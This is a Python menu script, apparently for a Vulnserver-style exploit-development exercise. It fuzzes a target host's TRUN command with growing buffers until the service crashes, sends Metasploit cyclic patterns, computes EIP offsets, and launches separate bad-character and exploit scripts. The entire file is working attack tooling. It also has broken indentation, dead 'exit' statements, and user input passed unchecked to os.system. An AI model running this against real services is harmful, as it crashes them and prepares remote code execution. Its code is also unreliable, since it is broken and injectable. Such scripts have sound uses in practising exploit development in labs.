# -*- coding: utf-8 -*-
"""
Created on Sat Apr 11 13:56:06 2020

@Author: Aporlorxl23
"""
import socket
import time
import sys
import os
from termcolor import colored,cprint

os.system("clear")
cprint("[+] Creator>> APORLORXL23","cyan",attrs={"blink"})
cprint("[+] Youtube>> Aporlorxl23","cyan")
cprint("[+] Instagram> Aporlorxl23","cyan")

cprint("""
[01] Fuzzing
[02] Pattern Create
[03] Pattern Offset
[04] Bad Chars
[05] Exploit
""","blue")
print(colored("[99] Exit","green"))
Option = int(input(colored("Option>> ","yellow")))
if Option == 1:
    Ip = raw_input(colored("[+] Target Ip Adress>> ","yellow"))
    Port = int(input(colored("[+] Target Open Port>> ","green")))
    Buffer = "TRUN /.:/" + "A" * 100
    while True:       
        try:
            Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Socket.connect((Ip, Port))
            Bytes= Buffer.encode(encoding="latin1")
            Socket.send(Bytes)
            Socket.close()
            Buffer = Buffer + "A" * 100
            time.sleep(1)
        except KeyboardInterrupt:
            print("[+] Crashed At>>"+ str(len(Buffer)))
            print("[+] Use>>"+str(500+(len(Buffer))))
            Socket.close()
    	    print(colored("[-] Exit...","red"))
            time.sleep(2)
            os.system("clear")
            print("[+] Crashed At>>"+ str(len(Buffer)))
            print("[+] Use>>"+str(500+(len(Buffer))))
            cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
	    break
        except:
            print("[+] Crashed At>>"+ str(len(Buffer)))
            print("[+] Use>>"+str(500+(len(Buffer))))
            Socket.close()
    	    print(colored("[-] Exit...","red"))
            time.sleep(2)
	    os.system("clear")
            print("[+] Crashed At>>"+ str(len(Buffer)))
            print("[+] Use>>"+str(500+(len(Buffer))))
            cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
            break
elif Option == 2:
    Ip = raw_input(colored("[+] Target Ip Adress>> ","yellow"))
    Port = int(input(colored("[+] Target Open Port>> ","green")))
    Number = raw_input(colored("[+] Enter Crashed Number : ","yellow"))
    print(colored("[+] Copy Pattern Create\n","blue"))
    time.sleep(1)
    os.system("./pattern_create.rb -l "+str(Number))
    Code = raw_input(colored("[+] Pattern Create : ","yellow"))
    Create = "TRUN /.:/" + Code
    Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        Socket.connect((Ip,Port))
        try:
	    Bytes = Create.encode(encoding="latin1")
            Socket.send(Bytes)
	    Socket.close()
    	    print(colored("[+] Send Pattern Create Success !","blue"))
            time.sleep(2)
            exit
            os.system("clear")
            cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
	except:
            print(colored("[-] Exit...","red"))
            time.sleep(2)
            exit
            os.system("clear")
            cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
    except:
	print(colored("[-] Connection Fail !","red"))
	Socket.close()
        print(colored("[-] Exit...","red"))
        time.sleep(2)
        exit
        os.system("clear")
        cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
elif Option == 3:
    Crash = raw_input(colored("[+] Crash Number>> ","yellow"))
    EIP = raw_input(colored("[+] EIP Code>> ","green"))
    time.sleep(2)
    exit
    os.system("clear")
    os.system("./pattern_offset.rb -l "+Crash+" -q "+EIP)
    cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
elif Option == 4:
    os.system("python3 BadChars.py")
elif Option == 5:
    os.system("python3 Exploit.py")
elif Option == 99:
    print(colored("[-] Exit...","red"))
    time.sleep(2)
    exit
    os.system("clear")
    cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})
else:
    cprint("[-] Please Select Options !","red")
    cprint("[+] Thanks For Use Aporlorxl23 !","yellow",attrs={"blink"})